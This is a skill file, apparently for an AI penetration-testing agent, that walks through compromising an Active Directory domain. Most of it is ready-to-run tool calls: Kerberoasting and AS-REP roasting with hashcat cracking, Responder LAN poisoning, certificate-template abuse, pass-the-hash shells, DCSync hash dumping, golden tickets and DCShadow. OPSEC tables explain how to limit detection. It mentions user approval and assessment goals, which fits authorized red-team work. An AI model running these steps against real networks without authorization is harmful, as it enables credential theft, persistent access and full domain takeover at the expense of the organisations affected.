name: ares/ad
description: "Active Directory assessment — full AD attack chain, bloodhound, certipy, kerberoasting, lateral movement."
version: 2.0.0
author: Cyberfox Agent
platforms: [linux]
metadata:
  cyberfox:
    tags: [Ares, Active-Directory, Pentest, Red-Team, Kerberos]
    related_skills: [ares/lead, ares/recon, ares/exploit]
    category: ares

---

# Ares Active Directory Skill — Domain Compromise

Assess Active Directory environments through the complete attack chain: enumeration → credential harvesting → privilege escalation → domain compromise. Every escalation tool requires explicit user approval.

## When to Use

- SMB/Kerberos/LDAP ports detected during recon (445, 88, 389, 636)
- Windows domain environment confirmed
- Goal is AD compromise (Domain Admin, DC sync, full domain dump)

## Prerequisites

- Domain controller IP or domain name identified in recon
- Valid creds OR null session access OR unauthenticated access to AD ports
- Tools: bloodhound-python, certipy-ad, netexec, impacket-*, kerbrute, responder, enum4linux, smbclient

## Full AD Attack Chain

```
ENUMERATION
├── crackmapexec(smb) → domain name, signing, shares
├── enum4linux → users, groups, policies
├── kerbrute(userenum) → valid usernames (no auth needed)
└── smbclient → null session check, share access

CREDENTIAL HARVESTING
├── Kerberoasting → service ticket extraction → offline crack
├── AS-REP roasting → pre-auth disabled accounts → offline crack
├── Responder → LLMNR/NBT-NS poison → NetNTLM hashes
├── GPP/cPassword → Group Policy Preferences creds
└── LSA secrets → service account passwords

PRIVILEGE ESCALATION
├── Bloodhound → shortest path to DA
├── Certificate abuse (ESC1-ESC8) → certipy → DA
├── Delegation abuse → impersonation → DA
├── ACL abuse → DCSync → DA
├── GPO abuse → scheduled task → DA
└── OU-based attacks → modified permissions

LATERAL MOVEMENT
├── Pass-the-Hash → PsExec/WMI/SMBExec
├── Pass-the-Ticket → Kerberos ticket reuse
├── Overpass-the-Hash → NTLM → Kerberos
├── WMI/DCOM → remote execution
└── RDP hijacking → session takeover

DOMAIN COMPROMISE
├── DCSync → dump all domain hashes
├── Golden Ticket → persistent domain access
├── Skeleton Key → injectable domain password
├── DCShadow → register rogue DC
└── Full dump → secretsdump on DC
```

## Step-by-Step Procedure

### 1. Initial Enumeration (No Auth Required)

**CrackMapExec — Domain Discovery**
```bash
crackmapexec(target="10.10.10.1", protocol="smb", username="", password="")
```
Returns: domain name, SMB signing status, OS version, domain SID.

**Enum4linux — Deep Enumeration**
```bash
enum4linux_scan(target="10.10.10.1")
```
Returns: user list, group list, shares, policies, password policy, OS info.

**Kerbrute — Username Enumeration (Kerberos)**
```bash
kerbrute_enum(target="10.10.10.1", mode="userenum", userlist="users.txt", domain="corp.local")
```
Kerberos pre-auth doesn't require valid creds — AS-REP errors reveal valid usernames.

**SMB Null Session**
```bash
smbclient_tool(target="10.10.10.1", share="IPC$", action="list")
```

### 2. Credential Harvesting

**Kerberoasting — Service Ticket Extraction**
```bash
impacket_exec(target="10.10.10.1", command="kerberoast", username="user", password="pass", domain="corp.local")
```
Extracts TGS tickets for service accounts → offline hashcat crack:
```
hashcat -m 13100 tickets.txt wordlist.txt -r rules/best64.rule
```

**AS-REP Roasting — Pre-Auth Disabled Accounts**
```bash
impacket_exec(target="10.10.10.1", command="getTGT", username="", domain="corp.local", flags="-usersfile users.txt -dc-ip 10.10.10.1")
```

**Responder — LLMNR/NBT-NS Poisoning**
```bash
responder_listener(interface="eth0", protocols="LLMNR,NBT-NS,MDNS", mode="poison")
```

**Credential Harvesting Priority:**
| Method | Success Rate | Noise |
|---|---|---|
| Kerberoasting | High (most service accounts have weak passwords) | Medium (logged by DC) |
| AS-REP Roasting | Medium (only works on disabled pre-auth accounts) | Low |
| Responder | High (if LLMNR/NBT-NS enabled) | Very High (poisons LAN) |
| Default creds | Medium (service accounts often use defaults) | Low |
| GPP/cPassword | Low (only if GPP was used) | Low |

### 3. Bloodhound — Attack Path Analysis

```bash
bloodhound_ingest(
    target="10.10.10.1",
    username="user",
    password="pass",
    domain="corp.local",
    dc_ip="10.10.10.1",
    collection="All"
)
```

**Bloodhound Collection Methods:**
| Collection | Data Gathered |
|---|---|
| `Default` | Users, groups, computers, ACLs, sessions |
| `All` + `DCSync` | Full data set including GPO, OU, trusts |
| `Group` | Group membership and nesting |
| `LocalAdmin` | Local admin rights across domain |

**Bloodhound Analysis Focus:**
1. Find shortest path to Domain Admin
2. Identify Kerberoastable accounts (high-priv service accounts)
3. Find AS-REP roastable accounts
4. Map trust relationships
5. Identify delegation configurations

### 4. Certificate Abuse (ADCS)

```bash
certipy_tool(target="10.10.10.1", action="find", username="user", password="pass", domain="corp.local", dc_ip="10.10.10.1")
```

**ESC1 — Misconfigured Certificate Template**
```
Template allows client auth + requestor can specify SAN → impersonate any user
certipy_tool(action="req", username="user", password="pass", template="VulnTemplate", upn="admin@corp.local")
```

**ESC2 — EKU Misconfiguration**
```
Template allows Any Purpose or no EKU → can be used for any purpose
```

**ESC4 — Template ACL Misconfiguration**
```
User can modify template → patch template to ESC1-vulnerable
```

**ESC7 — Vulnerable CA Access Control**
```
User has ManageCA or ManageCertificates → can issue/publish certificates
```

**ESC8 — HTTP Enrollment Relay**
```
HTTP certificate enrollment endpoint → relay NTLM auth → get certificate
```

### 5. Lateral Movement

**Pass-the-Hash with Impacket**
```bash
# PsExec — SYSTEM shell
impacket_exec(target="10.10.10.2", command="psexec", username="admin", hashes="aad3b435b51404eeaad3b435b51404ee:da76...")

# WMI — semi-interactive
impacket_exec(target="10.10.10.2", command="wmiexec", username="admin", hashes="...")

# SMBExec — file-based shell
impacket_exec(target="10.10.10.2", command="smbexec", username="admin", hashes="...")
```

**CrackMapExec — Mass Lateral Movement**
```bash
# Find local admins across network
crackmapexec(target="10.10.10.0/24", protocol="smb", username="admin", hashes="...", module="lsadump")
```

**Lateral Movement Decision:**
| Access Level | Technique |
|---|---|
| NTLM hash | Pass-the-Hash via PsExec/WMI |
| Kerberos ticket | Pass-the-Ticket via WMI |
| Plaintext password | Overpass-the-Hash → full Kerberos |
| Service account | Kerberoast → crack → PtH |

### 6. Domain Compromise

**DCSync — Dump All Domain Hashes**
```bash
impacket_exec(target="10.10.10.1", command="secretsdump", username="admin", hashes="...", domain="corp.local")
```
Requires: Domain Admin or DCSync rights (replication rights).

**Golden Ticket — Persistent Domain Access**
```bash
# After getting krbtgt hash from DCSync
impacket_exec(command="golden_ticket", domain="corp.local", username="krbtgt", hashes="...", sid="S-1-5-21-...")
```

**DCShadow — Register Rogue DC**
```bash
# Requires Domain Admin — register a rogue DC to modify attributes
impacket_exec(command="dcshadow", domain="corp.local", username="admin", hashes="...")
```

### 7. Documentation

Save every AD finding:
```bash
findings_save(
    title="Kerberoastable service account: svc_sql",
    severity="high",
    category="ad",
    target="10.10.10.1",
    evidence="TGS ticket extracted, hashcat mode 13100. Weak password cracked: Service123",
    cvss=7.5,
    tool="impacket_exec"
)
```

## OPSEC Considerations

| Technique | Detection Risk | Logs |
|---|---|---|
| Kerberoasting | Medium | Windows Event 4769 (TGS requests) |
| AS-REP Roasting | Low | Windows Event 4768 (AS-REQ errors) |
| Responder | Very High | Network monitoring |
| Bloodhound | Medium | LDAP query logs |
| Certipy | Medium | Certificate enrollment logs |
| DCSync | Very High | Windows Event 4662 (DS-Replication) |
| Pass-the-Hash | High | Windows Event 4624 (Logon Type 3) |

**AD OPSEC Rules:**
1. Password spray only 1-2 attempts per user to avoid lockout
2. Kerberoasting is logged — do it quickly, crack offline
3. Responder poisons the entire LAN — isolated segments only
4. DCSync is extremely noisy — last resort, coordinate with user
5. Clean up created accounts and certificates after assessment

## Pitfalls

- Bloodhound needs valid creds OR unauthenticated LDAP — if neither works, skip
- Certipy `request` is destructive on ESC templates — analyze first
- CrackMapExec sprays lock accounts — limit attempts
- Kerberos tickets have 10-hour lifetime by default
- Some service accounts are managed (gMSA) — can't crack those
- Always check if DC enforces NTLM restrictions
- If NTLM is disabled, focus on Kerberos attacks only

## Verification Checklist

- [ ] Domain name, DC IP, and domain users documented
- [ ] Bloodhound data ingested and attack paths analyzed
- [ ] Kerberoastable accounts identified and cracked
- [ ] AS-REP roastable accounts identified
- [ ] Certificate templates assessed for ESC vulnerabilities
- [ ] Lateral movement paths identified
- [ ] At least one escalation to Domain Admin (or confirmed unreachable)
- [ ] All credentials/hashes documented in findings
